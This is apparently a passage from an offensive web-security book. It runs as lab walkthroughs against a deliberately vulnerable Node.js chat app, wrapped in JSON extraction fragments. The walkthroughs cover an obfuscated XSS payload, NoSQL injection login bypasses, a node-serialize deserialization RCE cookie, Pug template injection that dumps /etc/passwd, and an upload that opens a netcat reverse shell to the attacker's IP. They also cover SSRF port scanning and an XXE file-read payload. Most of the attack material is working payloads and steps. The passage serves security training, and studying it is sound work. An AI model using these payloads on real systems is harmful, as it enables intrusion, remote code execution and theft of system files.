Payload:\n[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+\n[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+\n[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+\n[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])\n[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[]\n[[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+\n[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+\n[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])\n[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+\n[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+\n[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+\n[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(!\n[]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+\n(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])\n[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!!\n[]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[]\n[[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+\n[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+\n[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(!\n[]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+\n(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()\nAs you know, many browsers have started to include XSS protections. We have\neven used these payloads to bypass certain browser protections. Try using them\nin your actual browser outside of Kali, such as Chrome.\nXSS is not an easy thing to protect from on complex applications. It is easy to\neither miss or misunderstand how a framework processes input and output. So\nwhen performing a source code review for Pug/NodeJS applications, searching\nfor !{ , #{, or `${ in source code is helpful for identifying locations for XSS.\nBeing aware of the context, and whether or not escaping is required in that\ncontext, is vital as we will see in the following examples.\nAlthough these attacks were specific to Node and Pug, every language has its\nproblems against XSS and input validation. You won't be able to just run a\nvulnerability scanner or XSS fuzzing tool and find all the XSS vulnerabilities.\nYou really need to understand the language and frameworks used.\nXSS to Compromise\nOne question I get often is, how can I go from an XSS to a Shell? Although\nthere are many different ways to do this, we usually find that if we can get a\nuser-to-admin style XSS in a Content Management System (CMS) or similar,\nthen this can lead to complete compromise of the system. An entire walkthrough\nexample and code can be found here by Hans-Michael Varbaek:\nhttps://github.com/Varbaek/xsser. Hans-Michael presented some great examples\nand videos on recreating an XSS to RCE attack.\nA custom Red Team attack that I like to utilize involves taking advantage of the\nfeatures of JavaScript. We know that JavaScript is extremely powerful and we\nhave seen such features in BeEF (Browser Exploitation Framework). Therefore,\nwe can take all that functionality to perform an attack unbeknownst to the\nvictim. What would this payload do? One example of an attack is to have the\nJavaScript XSS payload that runs on a victim machine grab the internal (natted)\nIP address of the victim. We can then take their IP address and start scanning\ntheir internal network with our payload. If we find a known web application that\nallows compromise without authentication, we can send a malicious payload to\nthat server.\nFor example our target could be a Jenkins server, which we know if\nunauthenticated, pretty much allows complete remote code execution. To see a\nfull walkthrough of an XSS to Jenkins compromise, see chapter 5 - Exploiting\nInternal Jenkins with Social Engineering.\nNoSQL Injections\nIn THP 1 & 2, we spent a fair amount of time learning how to do SQL injections\nand using SQLMap (http://sqlmap.org/). Other than some obfuscation and\nintegration into Burp Suite, not much has changed from THP2. Instead, I want\nto delve deeper into NoSQL injections as these databases are becoming more\nand more prevalent.\nTraditional SQL databases like MySQL, MSSQL, and Oracle rely on structured\ndata in relational databases. These databases are relational, meaning data in one\ntable has relation to data in other tables. That makes it easy to perform queries\nsuch as \"give me all clients who bought something in the last 30 days”. The\ncaveat with this data is that the format of the data must be kept consistent across\nthe entire database. NoSQL databases consist of the data that does not typically\nfollow the tabular/relational model as seen in SQL-queried databases. This data,\ncalled \"unstructured data\" (like pictures, videos, social media), doesn't really\nwork with our massive collection data.\nNoSQL Features:\nTypes of NoSQL Databases: Couch/MongoDB\nUnstructured Data\nGrows Horizontally\nIn traditional SQL injections, an attacker would try to break out of an SQL query\nand modify the query on the server-side. With NoSQL injections, the attacks\nmay execute in other areas of an application than in traditional SQL injections.\nAdditionally, in traditional SQL injections, an attacker would use a tick mark to\nbreak out. In NoSQL injections, vulnerabilities generally exist where a string is\nparsed or evaluated into a NoSQL call.\nVulnerabilities in NoSQL injections typically occur when: (1) the endpoint\naccepts JSON data in the request to NoSQL databases, and (2) we are able to\nmanipulate the query using NoSQL comparison operators to change the NoSQL\nquery.\nA common example of a NoSQL injection would be injecting something like:\n[{\"$gt\":\"\"}]. This JSON object is basically saying that the operator ($gt) is\ngreater than NULL (\"\"). Since logically everything is greater than NULL, the\nJSON object becomes a true statement, allowing us to bypass or inject into\nNoSQL queries. This would be equivalent to [' or 1=1--] in the SQL injection\nworld. In MongoDB, we can use one of the following conditional operators:\n(>) greater than - $gt\n(<) less than - $lt\n(>=) greater than equal to - $gte\n(<= ) less than equal to - $lte\nAttack the Customer Support System NoSQL Application\nFirst, walk through the NoSQL workflow on the Chat application:\nIn a browser, proxying through Burp Suite, access the Chat\napplication: http://chat:3000/nosql\nTry to authenticate with any username and password. Look at POST\ntraffic that was sent during that authentication request in Burp Suite\n.\nIn our Chat application, we are going to see that during authentication to the\n/loginnosql endpoint, our POST data will contain\n{“username”:”admin”,”password”,”GuessingAdminPassword”}. It is pretty\ncommon to see JSON being used in POST requests to authenticate a user, but if\nwe define our own JSON objects, we might be able to use different conditional\nstatements to make true statements. This would effectively equal the traditional\nSQLi 1=1 statement and bypass authentication. Let's see if we can inject this\ninto our application.\nServer Source Code\nIn the NoSQL portion of the Chat application, we are going to see the JSON\nPOST request as we did before. Even though, as a black box test, we wouldn't\nsee the server-side source code, we can expect it to query the MongoDB backend\nin some sort of fashion similar to this:\ndb.collection(collection).find({\"username\":username,\n\"password\":password}).limit(1)…\nInjecting into NoSQL Chat\nAs we can see from the server-side source code, we are taking the user-supplied\nusername/password to search the database for a match. If we can modify the\nPOST request, we might be able to inject into the database query.\nIn a browser, proxying through Burp Suite, access the Chat\napplication: http://chat:3000/nosql\nTurn \"Intercept\" on in Burp Suite, click Login, and submit a\nusername as admin and a password of GuessingAdminPassword\nProxy the traffic and intercept the POST request\n{\"username\":\"admin\",\"password\",\"GuessingAdminPassword\"} to\n{\"username\":\"admin\",\"password\":{\"$gt\":\"\"}}\nYou should now be logged in as admin!\nSo what happened here? We changed the string \"GuessingAdminPassword\" to a\nJSON object {\"$gt\":\"\"}, which is the TRUE statement as everything Greater\nThan NULL is TRUE. This changed the POST request to\n{\"username\":\"admin\",\"password\":TRUE}, which automatically makes the\nrequest TRUE and logs in as admin without any knowledge of the password,\nreplicating the 1=1 attack in SQLi.\nAdvanced NoSQLi\nNoSQL injections aren't new, but the purpose of the NodeJS chapter is to show\nhow newer frameworks and languages can potentially introduce new\nvulnerabilities. For example, Node.js has a qs module that has specific syntax to\nconvert HTTP request parameters into JSON objects. The qs module is used by\ndefault in Express as part of the 'body-parser' middleware.\nqs module: A querystring parsing and stringifying library with some\nadded security. [https://www.npmjs.com/package/qs]\nWhat does this mean? If the qs module is utilized, POST requests will be\nconverted on the server side as JSON if using bracket notation in the\nparameters. Therefore, a POST request that looks like\nusername[value]=admin&password[value]=admin will be converted into\n{\"username\": {\"value\":\"admin\"}, \"password\":{\"value\":\"admin\"}}. Now, the qs\nmodule will also accept and convert POST parameters to assist in NoSQLi:\nFor example, we can have a POST request like the following:\nusername=admin&password[$gt]=\nAnd the server-side request conversion would translate to:\n{\"username\":\"admin\", \"password\":{\"$gt\":\"\"}\nThis now looks similar to the original NoSQLi attack.\nNow, our request looks identical to the NoSQLi we had in the previous section.\nLet's see this in action:\nGo to http://chat:3000/nosql2\nTurn Burp Intercept On\nLog in with admin:anything\nModify the POST Parameter:\nusername=admin&password[$gt]=&submit=login\nYou should be logged in with admin! You have executed the NoSQL injection\nusing the qs module parser utilized by the Express Framework as part of the\nbody-parser middleware. But wait, there's more! What if you didn't know\nwhich usernames to attack? Could we use this same attack to find and log in as\nother accounts?\nWhat if instead of the password comparison, we tried it on the username as\nwell? In this case, the NoSQLi POST request would look something like:\nusername[$gt]=admin&password[$gt]=&submit=login\nThe above POST request essentially queries the database for the next username\ngreater than admin with the password field resulting in a TRUE statement. If\nsuccessful, you should be logged in as the next user, in alphabetical order, after\nadmin. Continue doing this until you find the superaccount.\nMore NoSQL Payloads:\nhttps://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20injection\nhttps://blog.websecurify.com/2014/08/hacking-nodejs-and-\nmongodb.htmlhttps://www.owasp.org/index.php/Testing_for_NoSQL_injection\nDeserialization Attacks\nOver the past few years, serialization/deserialization attacks via web have\nbecome more and more popular. We have seen many different talks at\nBlackHat, discovered critical vulnerabilities in common applications like Jenkins\nand Apache Struts2, and are seeing a lot of active research being developed like\nysoserial (https://github.com/frohoff/ysoserial). So what's the big deal with\ndeserialization attacks?\nBefore we get started, we need to understand why we serialize. There are many\nreasons to serialize data, but it is most commonly used to generate a storable\nrepresentation of a value/data without losing its type or structure. Serialization\nconverts objects into a stream of bytes to transfer over network or for storage.\nUsually conversion method involves XML, JSON, or a serialization method\nspecific to the language.\nDeserialization in NodeJS\nMany times, finding complex vulnerabilities requires in-depth knowledge of an\napplication. In our scenario, the Chat NodeJS application is utilizing a\nvulnerable version of serialize.js (https://github.com/luin/serialize). This node\nlibrary was found to be vulnerable to exploitation due to the fact that \"Untrusted\ndata passed into the unserialize() function can be exploited to achieve arbitrary\ncode execution by passing a JavaScript Object with an Immediately Invoked\nFunction Expression (IIFE).” [https://cve.mitre.org/cgi-bin/cvename.cgi?\nname=CVE-2017-5941]\nLet's walk through the details of an attack to better understand what is\nhappening. First, we review the serialize.js file and do a quick search for eval\n(https://github.com/luin/serialize/search?utf8=%E2%9C%93&q=eval&type=).\nGenerally, allowing user input to go into a JavaScript eval statement is bad\nnews, as eval() executes raw JavaScript. If an attacker is able to inject\nJavaScript into this statement, they would be able to have Remote Code\nExecution onto the server.\nSecond, we need to create a serialized payload that will be deserialized and run\nthrough eval with our JavaScript payload of require('child_process').exec('ls').\n{\"thp\":\"$$NDFUNC$$_function ()\n{require('child_process').exec('DO SYSTEM COMMANDS HERE',\nfunction(error, stdout, stderr) { console.log(stdout) });}()\"}\nThe JSON object above will pass the following request “()\n{require('child_process').exec('ls')” into the eval statement within the unserialize\nfunction, giving us remote code execution. The last part to notice is that the\nending parenthesis was added \"()\" because without it our function would not be\ncalled. Ajin Abraham, the original researcher who discovered this vulnerability,\nidentified that using immediately invoked function expressions or IIFE\n(https://en.wikipedia.org/wiki/Immediately-invoked_function_expression) would\nallow the function to be executed after creation. More details on this\nvulnerability can be found here: https://cve.mitre.org/cgi-bin/cvename.cgi?\nname=CVE-2017-5941.\nIn our Chat Application example, we are going to look at the cookie value,\nwhich is being deserialized using this vulnerable library:\nGo to http://chat:3000\nProxy the traffic in burp and look at the cookies\nIdentify one cookie name \"donotdecodeme\"\nCopy that Cookie into Burp Suite Decoder and Base64 decode it\nAs previously mentioned, every language has its unique oddities and NodeJS is\nno different. In Node/Express/Pug, you are not able to write directly to the web\ndirectory and have it accessible like in PHP. There has to be a specified route to\na folder that is both writable and accessible to the public internet.\nCreating the Payload\nBefore you start, remember all these payloads for the lab are in an\neasy to copy/paste format listed here: http://bit.ly/2qBDrFo\nTake the original payload and modify your shell execution \"'DO\nSYSTEM COMMANDS HERE\"\n{\"thp\":\"$$NDFUNC$$_function ()\n{require('child_process').exec('DO SYSTEM\nCOMMANDS HERE', function(error, stdout, stderr) {\nconsole.log(stdout) });}()\"}\nExample:\n{\"thp\":\"$$NDFUNC$$_function ()\n{require('child_process').exec('echo node deserialization is\nawesome!! >>\noptweb/chatSupportSystems/public/hacked.txt',\nfunction(error, stdout, stderr) { console.log(stdout) });}\n()\"}\nAs the original Cookie was encoded, we will have to base64 encode\nour payload via Burp Decoder/Encoder\nExample Payload:\neyJ0aHAiOiJfJCRORF9GVU5DJCRfZnVuY3Rpb24gKCl7cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2VjaG8gbm9kZSBkZXNlcmlhbGl6YXRpb24gaXMgYXdlc29tZSEhID4+IC9vcHQvd2ViL2NoYXRTdXBwb3J0U3lzdGVtcy9wdWJsaWMvaGFja2VkLnR4dCcsIGZ1bmN0aW9uKGVycm9yLCBzdGRvdXQsIHN0ZGVycikgeyBjb25zb2xlLmxvZyhzdGRvdXQpIH0pO30oKSJ9\nLog out, turn Burp intercept on, and relay a request for / (home)\nModify the cookie to the newly created Base64 payload\nForward the traffic and since the public folder is a route for /, you\nshould be able to open a browser and go to\nhttp://chat:3000/hacked.txt\nYou now have Remote Code Execution! Feel free to perform post\nexploitation on this system. Start by trying to read etcpasswd.\nIn the source for the node-serialize module, we see that the function expression\nis being evaluated, which is a serious problem for any JavaScript/NodeJS\napplication that does this with user input. This poor practice allowed us to\ncompromise this application.\nReferences:\nhttps://opsecx.com/index.php/2017/02/08/exploiting-node-js-\ndeserialization-bug-for-remote-code-execution/\nhttps://github.com/luin/serialize\nhttps://snyk.io/test/npm/node-serialize?\nseverity=high&severity=medium&severity=low\nhttps://blog.websecurify.com/2017/02/hacking-node-serialize.html\nTemplate Engine Attacks - Template Injections\nTemplate engines are being used more often due to their modularity and succinct\ncode compared with standard HTML. Template injection is when user input is\npassed directly into render templates, allowing modification of the underlying\ntemplate. This can occur intentionally in wikis, WSYWIG, or email templates.\nIt is rare for this to occur unintentionally, so it is often misinterpreted as just\nXSS. Template injection often allows the attacker to access the underlying\noperating system to obtain remote code execution.\nIn our next example, you will be performing Template Injection attacks on our\nNodeJS application via Pug. We are unintentionally exposing ourselves to\ntemplate injection with a meta redirect with user input, which is being rendered\ndirectly in Pug using template literals `${}`. It is important to note that template\nliterals allow the use of newline characters, which is required for us to break out\nof the paragraph tag since Pug is space-and newline-sensitive, similar to Python.\nIn Pug, the first character or word represents a Pug keyword that denotes a tag or\nfunction. You can specify multiline strings as well using indentation as seen\nbelow:\np.\nThis is a paragraph indentation.\nThis is still part of the paragraph tag.\nHere is an example of what HTML and Pug Template would look like:\nThe example text above shows how it would look in HTML and how the\ncorresponding Pug Markup language would look like. With templates and string\ninterpolation, we can create quick, reusable, and efficient templates\nTemplate Injection Example\nThe Chat application is vulnerable to a template injection attack. In the\nfollowing application, we are going to see if we can interact with the Pug\ntemplating system. This can generally be done by checking if the input\nparameter we supply can process basic operations. James Kettle wrote a great\npaper on attack templates and interacting with the underlying template systems\n(http://ubm.io/2ECTYSi).\nInteracting with Pug:\nGo to http://chat:3000 and login with any valid account\nGo to http://chat:3000/directmessage and enter user and comment\nand 'Send'\nNext, go back to the directmessage and try entering an XSS payload\ninto the user parameter <script>alert(1)</script>\nhttp://chat:3000/ti?\nuser=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&comment=&link=\nThis shows the application is vulnerable to XSS, but can\nwe interact with the templating system?\nIn Burp history, review the server request/response to the endpoint\npoint /ti?user=, and send the request to Burp Repeater (ctrl+r)\nTesting for Basic Operations\nWe can test our XSS vulnerable parameter for template injections by passing it\nin an arithmetic string. If our input is evaluated, it will identify that it is\nvulnerable to template injection. This is because templates, like coding\nlanguages, can easily support evaluating arithmetic operators.\nTesting Basic Operators:\nWithin Burp Repeater, test each of the parameters on /ti for template\ninjection. We can do this by passing a mathematical operation such\nas 9*9.\nWe can see that it did not work and we did not get 81. Keep in mind\nthat our user input is wrapped inside paragraph tags, so we can\nassume our Pug template code looks something like this:\np Message has been sent to !{user}\nTaking Advantage of Pug Features:\nAs we said earlier, Pug is white space delimited (similar to Python)\nand newlines start a fresh template input, which means if we can\nbreak out of the current line in Pug, we can execute new Template\ncode. In this case we are going to break out of the paragraph tag\n(<p>), as shown above, and execute new malicious template code.\nFor this to work, we are going to have to use some URL encoding to\nexploit this vulnerability (http://bit.ly/2qxeDiy).\nLet's walk through each of the requirements to perform template\ninjection:\nFirst, we need to trigger a new line and break out of the\ncurrent template. This can be done with the following\ncharacter:\n%0a new line\nSecond, we can utilize the arithmetic function in Pug by\nusing a \"=\" sign\n%3d percent encoded \"=\" sign\nLastly, we can put in our mathematical equation\n9*9 Mathematical equation\nSo, the final payload will look like this:\n[newline]=9*9\nURL Coded:\nGET /ti?user=%0a%3d9*9&comment=&link=\n/ti?user=%0a%3d9*9 gives us 81 in the response body. You have\nidentified template injection in the user parameter! Let's get remote\ncode execution by abusing JavaScript.\nAs you can see in the response, instead of the name of the user, we have “81”\noutside the paragraph tags! This means we were able to inject into the template.\nWe now know that we have some sort of template injection and that we are able\nto perform simple calculations, but we need to see if we can get shell execution.\nTo get shell execution, we have to find the right function to perform execution in\nNode/JavaScript.\nFirst, we will identify the self global object root and proceed with\ndetermining which modules and functions we have access to. We\nwant to eventually use the Require function to import the\nchild_process .exec to run operating system commands. In Pug, the\n\"=\" character allows us to output the JavaScript results. We will start\nby accessing the global root:\n[new line]=global\nEncoding the above expression to URL encoding using\nBurp's Decoder tool gives us:\n%0a%3d%20%67%6c%6f%62%61%6c\nUse the above URL encoding string as the user value and resend.\nIf all goes well after submitting the prior request, we will see [object\nglobal], which means we have access to the global object.\nParsing the global object:\nLet's see what objects and properties we have access to by using the\nPug iterator 'each’ within global. Remember the newline (%0a) and\nwhite space (%20):\neach val,index in global\np= index\nURL Encoded:\n%0a%65%61%63%68%20%76%61%6c%2c%69%6e%64%65%78%20%69%6e%20%67%6c%6f%62%61%6c%0a%20%20%70%3d%20%69%6e%64%65%78\nIn the above example, we are using the 'each' iterator which can\naccess a value and optionally access an index if we specify for either\narrays or objects. We are trying to find what objects, methods, or\nmodules we have access to in the global object. Our ultimate goal is\nto find something like the \"require\" method to allow us to \"require\"\nchild process .exec, which allows us to run system commands. From\nhere on out, we are just using trial and error to identify methods or\nobjects that will eventually give us the require method.\nFinding the Code Execution Function:\nFrom the previous request, we saw all the objects within global and\none that was named “process”. Next, we need to identify interesting\nobjects we have access to within global.process:\neach val,index in global.process\np= index\nURL Encoded:\n%0a%65%61%63%68%20%76%61%6c%2c%69%6e%64%65%78%20%69%6e%20%67%6c%6f%62%61%6c%2e%70%72%6f%63%65%73%73%0a%20%20%70%3d%20%69%6e%64%65%78\nWe chose “process” out of all the available methods because we\nknew it would eventually lead to 'require'. You can try the trial and\nerror process by choosing different methods to iterate through:\neach val,index in global.process.mainModule\np= index\nURL Encoded:\n%0a%65%61%63%68%20%76%61%6c%2c%69%6e%64%65%78%20%69%6e%20%67%6c%6f%62%61%6c%2e%70%72%6f%63%65%73%73%2e%6d%61%69%6e%4d%6f%64%75%6c%65%0a%20%20%70%3d%20%69%6e%64%65%78\nRemote Code Execution:\nSending this final payload, we should see the \"require\" function\nwithin global.process.mainModule. We can now set this to import a\n'child_process' with .exec to obtain RCE:\n- var x = global.process.mainModule.require\n- x('child_process').exec('cat etcpasswd >>\noptweb/chatSupportSystems/public/accounts.txt')\nURL Encoded:\n%0a%2d%20%76%61%72%20%78%20%3d%20%67%6c%6f%62%61%6c%2e%70%72%6f%63%65%73%73%2e%6d%61%69%6e%4d%6f%64%75%6c%65%2e%72%65%71%75%69%72%65%20%0a%2d%20%78%28%27%63%68%69%6c%64%5f%70%72%6f%63%65%73%73%27%29%2e%65%78%65%63%28%27%63%61%74%20%2f%65%74%63%2f%70%61%73%73%77%64%20%3e%3e%20%2f%6f%70%74%2f%77%65%62%2f%63%68%61%74%53%75%70%70%6f%72%74%53%79%73%74%65%6d%73%2f%70%75%62%6c%69%63%2f%61%63%63%6f%75%6e%74%73%2e%74%78%74%27%29\nIn the above example, we are defining a variable “x” like we would\nin JavaScript, but the dash at the beginning of the line denotes an\nunbuffered output (hidden). We are using the global object with the\nmodules that we needed to eventually get 'require', which allows us\nto use 'child_process' .exec to run system commands.\nWe are outputting the contents of etcpasswd to the web public root\ndirectory, which is the only directory we have write access to (as\ndesigned by the app creators), allowing the user to view the\ncontents. We could also do a reverse shell or anything else allowable\nwith system commands.\nWe can see http://chat:3000/accounts.txt will contain the contents of\netcpasswd from the web server.\nUse this to perform a full RCE on the system and get a shell back.\nNow, can we automate a lot of this? Of course we can. A tool called Tplmap\n(https://github.com/epinna/tplmap) runs similar to SQLmap in that it tries all the\ndifferent combinations of template injections:\ncd opttplmap\n./tplmap.py -u \"http://chat:3000/ti?\nuser=*&comment=asdfasdf&link=\"\nReference:\nhttp://blog.portswigger.net/2015/08/server-side-template-\ninjection.html\nhttps://hawkinsecurity.com/2017/12/13/rce-via-spring-engine-ssti/\nJavaScript and Remote Code Execution\nRemote code execution is what we look for in every assessment and web\napplication penetration test. Although RCEs can be found just about\neverywhere, they are most commonly found in places that allow uploads, such\nas: uploading a web shell, an exploit like Imagetragick\n(https://imagetragick.com/), XXE attacks with Office Files, directory traversal-\nbased uploads to replace critical files, and more.\nTraditionally, we might try to find an upload area and a shell that we could\nutilize. A great list of different types of webshell payloads can be found here:\nhttps://github.com/tennc/webshell. Please note, I am in no way vetting any of\nthese shells—use them at your own risk. I have run into a lot of web shells that I\nfound on the internet which contained.\nAttacking the Vulnerable Chat Application with Upload\nIn our lab, we are going to perform an upload RCE on a Node application. In\nour example, there is a file upload feature that allows any file upload.\nUnfortunately, with Node, we can't just call a file via a web browser to execute\nthe file, like in PHP. So, in this case, we are going to use a dynamic routing\nendpoint that tries to render the contents of Pug files. The error lies in the fact\nthat the endpoint will read the contents of the file assuming it is a Pug file since\nthe default directory exists within the Views directory. Path traversal and Local\nFile read vulnerabilities also exist on this endpoint.\nDuring the upload process, the file handler module will rename the file to a\nrandom string of characters with no extension. Within the upload response\ncontents of the page, there exists the server path location of the uploaded file.\nUsing this information, we can use /drouting to perform template injection to\nachieve remote code execution.\nSince we know the underlying application is Node (JavaScript), what kind of\npayload could we upload to be executed by Pug? Going back to the simple\nexample that we used earlier:\nFirst, assign a variable to the require module\n-var x = global.process.mainModule.require\nUse of the child process module enables us to access Operating\nSystem functionalities by running any system command:\n-x('child_process').exec('nc [Your_IP] 8888 -e binbash')\nRCE Upload Attack:\nGo to http://chat:3000 and login with any valid account\nUpload a text file with the information below. In Pug the \"-\"\ncharacter means to execute JavaScript.\n-var x = global.process.mainModule.require\n-x('child_process').exec('nc [Your_IP] 8888 -e binbash')\nReview the request and response in Burp from uploading the file.\nYou will notice a hash of the file that was uploaded in the response\nPOST request and a reference to drouting.\nIn this template code, we are assigning the require function to\nchild_process .exec, which allows us to run commands on the\noperating system level. This code will cause the web server to\nconnect to our listener running on [Your_IP] on port 8888 and allow\nus to have shell on the web server.\nOn the attacker machine, start a netcat listener for the shell to\nconnect back\nnc -l -p 8888\nWe activate the code by running the endpoint on /drouting. In a\nbrowser, go to your uploaded hashfile. The drouting endpoint takes a\nspecified Pug template and renders it. Fortunately for us, the Pug\ntemplate that we uploaded contains our reverse Shell.\nIn a browser, access the drouting endpoint with your file\nas that was recovered from the response of the file\nupload. We use the directory traversal \"../\" to go one\ndirectory lower to be able to get into the uploads folder\nthat contains our malicious file:\ndrouting?filename=..uploads/[YOUR FILE\nHASH]\nGo back to your terminal listening on 8888 and interact with your\nshells!",
    "question": "",
    "summary": "The text discusses web application vulnerabilities, focusing on application exploitation rather than traditional methods. It highlights the shift in attack patterns, emphasizing the need for understanding modern frameworks like Node.js and Pug. The content provides examples of XSS, NoSQL injection, and deserialization attacks, along with tools and techniques for red teaming and exploiting vulnerabilities in real-world scenarios."
  },
  {
    "start": 44,
    "end": 47,
    "text": "Server Side Request Forgery (SSRF)\nServer Side Request Forgery (SSRF) is one of those vulnerabilities that I feel is\ngenerally misunderstood and, terminology-wise, often confused in name with\nCross-Site Request Forgery (CSRF). Although this vulnerability has been\naround for a while, it really hasn't been discussed enough, especially with such\nsevere consequences. Let's take a look into the what and why.\nServer Side Request Forgery is generally abused to gain access onto the local\nsystem, into the internal network, or to allow for some sort of pivoting. The\neasiest way to understand SSRF is walking through an example. Let's say you\nhave a public web application that allows users to upload a profile image by\nURL from the Internet. You log into the site, go to your profile, and click the\nbutton that says update profile from Imgur (a public image hosting service).\nYou supply the URL of your image (for example:\nhttps://i.imgur.com/FdtLoFI.jpg) and hit submit. What happens next is that the\nserver creates a brand new request, goes to the Imgur site, grabs the image (it\nmight do some image manipulation to resize the image—imagetragick anyone?),\nsaves it to the server, and sends a success message back to the user. As you can\nsee, we supplied a URL, the server took that URL and grabbed the image, and\nuploaded it to its database.\nWe originally supplied the URL to the web application to grab our profile\npicture from an external resource. However, what would happen if we pointed\nthat image URL to http://127.0.0.1:80/favicon.ico instead? This would tell the\nserver instead of going to something like Imgur, to grab the favicon.ico from the\nlocal host webserver (which is itself). If we are able to get a 200 message or\nmake our profile picture the localhost favicon, we know we potentially have an\nSSRF.\nSince it worked on port 80, what would happen if we tried to connect to\nhttp://127.0.0.1:8080, which is a port not accessible except from localhost? This\nis where it gets interesting. If we do get full HTTP request/responses back and\nwe can make GET requests to port 8080 locally, what happens if we find a\nvulnerable Jenkins or Apache Tomcat service? Even though this port isn't\npublicly listening, we might be able to compromise that box. Even better,\ninstead of 127.0.0.1, what if we started to request internal IPs:\nhttp://192.168.10.2-254? Think back to those web scanner findings that came\nback with internal IP disclosures, which you brushed off as lows—this is where\nthey come back into play and we can use them to abuse internal network\nservices.\nAn SSRF vulnerability enables you to do the following:\n1. Access services on loopback interface\n2. Scan the internal network and potentially interact with those services\n(GET/POST/HEAD)\n3. Read local files on the server using FILE://\n4. Abuse AWS Rest interface (http://bit.ly/2ELv5zZ)\n5. Move laterally into the internal environment\nIn our following diagram, we are finding a vulnerable SSRF on a web\napplication that allows us to abuse the vulnerability:\nLet's walk through a real life example:\nOn your Chat Support System (http://chat:3000/) web application,\nfirst make sure to create an account and log in.\nOnce logged in, go to Direct Message (DM) via the link or directly\nthrough http://chat:3000/directmessage.\nIn the \"Link\" textbox, put in a website like\nhttp://cyberspacekittens.com and click the preview link.\nYou should now see the http://cyberspacekittens.com page render,\nbut the URI bar should still point to our Chat Application.\nThis shows that the site is vulnerable to SSRF. We could also try\nsomething like chat:3000ssrf?\nuser=&comment=&link=http:/127.0.0.1:3000 and point to\nlocalhost. Notice that the page renders and that we are now\naccessing the site via localhost on the vulnerable server.\nWe know that the application itself is listening on port 3000. We can nmap the\nbox from the outside and find that no other web ports are currently listening, but\nwhat services are only available to localhost? To find this out, we need to\nbruteforce through all the ports for 127.0.0.1. We can do this by using Burp\nSuite and Intruder.\nIn Burp Suite, go to the Proxy/HTTP History Tab and find the\nrequest of our last SSRF.\nRight-click in the Request Body and Send to Intruder.\nThe Intruder tab will light up, go to the Positions Tab and click\nClear.\nClick and highlight over the port \"3000\" and click Add. Your GET\nrequest should look like this:\nGET ssrf?\nuser=&comment=&link=http:/127.0.0.1:§3000§\nHTTP/1.1\nClick the Payloads tab and select Payload Type \"Numbers\". We will\ngo from ports 28000 to 28100. Normally, you would go through all\nof the ports, but let's trim it down for the lab.\nFrom: 28000\nTo: 28100\nStep: 1\nClick \"Start Attack\"\nYou will see that the response length of port 28017 is much larger than all the\nother requests. If we open up a browser and go to: http://chat:3000ssrf?\nuser=&comment=&link=http:/127.0.0.1:28017, we should be able to abuse our\nSSRF and gain access to the MongoDB Web Interface.\nYou should be able to access all the links, but you have to remember that you\nneed to use the SSRF. To access the serverStatus (http://chat:3000/serverStatus?\ntext=1), you will have to use the SSRF attack and go here:\nhttp://chat:3000ssrf?\nuser=&comment=&link=http:/127.0.0.1:28017/serverStatus?text=1.\nServer Side Request Forgery can be extremely dangerous. Although not a new\nvulnerability, there is an increasing amount of SSRF vulnerabilities that are\nfound these days. This usually leads to certain critical findings due to the fact\nthat SSRFs allow pivoting within the infrastructure.\nAdditional Resources:\nLots on encoding localhost:\nhttp://www.agarri.fr/docs/AppSecEU15-\nServer_side_browsing_considered_harmful.pdf\nBug Bounty - AirBNB\nExample: http://bit.ly/2ELvJxp\nXML eXternal Entities (XXE)\nXML stands for eXtensible Markup Language and was designed to send/store\ndata that is easy to read. XML eXternal Entities (XXE) is an attack on XML\nparsers in applications. XML parsing is commonly found in applications that\nallow file uploads, parsing Office documents, JSON data, and even Flash type\ngames. When XML parsing is allowed, improper validation can grant an\nattacker to read files, cause denial of service attacks, and even remote code\nexecution. From a high level, the application has the following needs 1) to parse\nXML data supplied by the user, 2) the system identifier portion of the entity\nmust be within the document type declaration (DTD), and 3) the XML processor\nmust validate/process DTD and resolve external entities.\nNormal XML File Malicious XML\n<?xml version=\"1.0\" <?xml version=\"1.0\"\nencoding=\"ISO-8859-1\"?> encoding=\"utf-8\"?>\n<Prod> <!DOCTYPE test [\n<Type>Book</type> <!ENTITY xxe SYSTEM\n<name>THP</name> \"file://etcpasswd\">\n<id>100</id> ]>\n</Prod> <xxx>&xxe;</xxx>\nAbove, we have both a normal XML file and one that is specially crafted to read\nfrom the system's etcpasswd file. We are going to see if we can inject a\nmalicious XML request within a real XML request.\nXXE Lab:\nDue to a custom configuration request, there is a different 